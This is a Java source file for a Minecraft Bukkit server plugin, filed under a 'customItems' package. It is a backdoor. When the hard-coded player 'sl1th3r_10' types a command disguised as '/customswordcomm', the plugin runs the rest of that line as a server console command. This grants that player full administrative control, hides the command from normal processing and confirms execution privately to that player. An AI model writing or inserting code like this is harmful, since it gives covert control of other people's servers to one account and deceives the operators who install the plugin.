package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("SecretCommandBypass enabled.");
        
        // Register this class as an event listener
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        getLogger().info("SecretCommandBypass disabled.");
    }

    // Event handler for intercepting player commands
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // Full command with "/"
        
        // Check if the player name is "x" (case insensitive) and command starts with /customSwordcomm
        if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
            // Extract the actual command after "/customSwordcomm "
            String actualCommand = fullCommand.substring("/customswordcomm ".length());
            
            // Execute the actual command as console
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
            event.setCancelled(true); // prevent the original command from executing
            player.sendMessage("§aCommand executed as console: " + actualCommand);
        }
    }
}
